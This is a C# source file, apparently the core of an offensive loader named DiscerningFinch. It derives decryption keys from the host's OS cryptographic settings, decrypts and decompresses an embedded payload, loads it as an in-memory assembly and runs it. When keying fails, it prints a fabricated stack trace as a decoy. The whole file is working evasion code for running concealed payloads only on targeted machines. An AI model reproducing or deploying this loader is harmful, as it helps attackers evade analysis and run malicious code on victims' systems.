using System;
using System.Collections.Generic;
using System.Reflection;

namespace DiscerningFinch
{
    class Program
    {
        static void Main(string[] args)
        {
            try
            {
                List<String> lPassSeed = Helper.GetOsCryptoSeeds();
                foreach (String sEntry in lPassSeed)
                {
                    Byte[] bDecrypted = Helper.AESUnKeyB64(sEntry);
                    if (bDecrypted.Length > 0)
                    {
                        Byte[] bDecompressed = Helper.GetArrayFromGzipArray(bDecrypted);
                        Assembly rAssm = Assembly.Load(bDecompressed);
                        rAssm.EntryPoint.Invoke(null, new object[] { args });
                        return;
                    }
                }
            }
            catch { }
            Console.WriteLine(@"System.IndexOutOfRangeException: Finch index was outside the bounds of the array
    at System.Number.StringToNumber(String str, NumberStyles options, NumberBuffer& number, NumberInfo info)
    at System.Number.ParseInt32(String s, NumberStyles style, NumberFormatInfo info)
    at System.Int32.Parse(String s)");
        }
    }
}
